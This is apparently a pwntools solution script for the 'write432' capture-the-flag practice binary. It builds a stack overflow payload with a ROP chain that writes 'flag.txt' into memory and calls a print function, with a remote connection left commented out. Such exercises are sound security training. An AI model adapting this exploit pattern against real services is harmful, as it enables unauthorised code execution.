from pwn import *
from pwn import p32
import socket
from ctypes import *
context(arch='i386', os='linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libwrite432.so')
r = process("./write432")

flag_print_addr = 0x80483d0

data_addr = 0x0804a018
mov_edi_ebp = 0x08048543
pop_edi_ebp = 0x080485aa

# payload = b'A'* 0x28 +b'junk'+ p32(flag_print_addr) + p32(0)+b"flag.txt\x00"

payload = b'A' * 0x28 + b'junk' + p32(pop_edi_ebp) + p32(data_addr) + b"flag"
payload += p32(mov_edi_ebp) + p32(pop_edi_ebp) + p32(data_addr+4) + b'.txt'
payload +=p32(mov_edi_ebp) + p32(flag_print_addr) + b'BBBB' + p32(data_addr) 

# pause()

r.sendlineafter(b">", payload)

r.interactive()
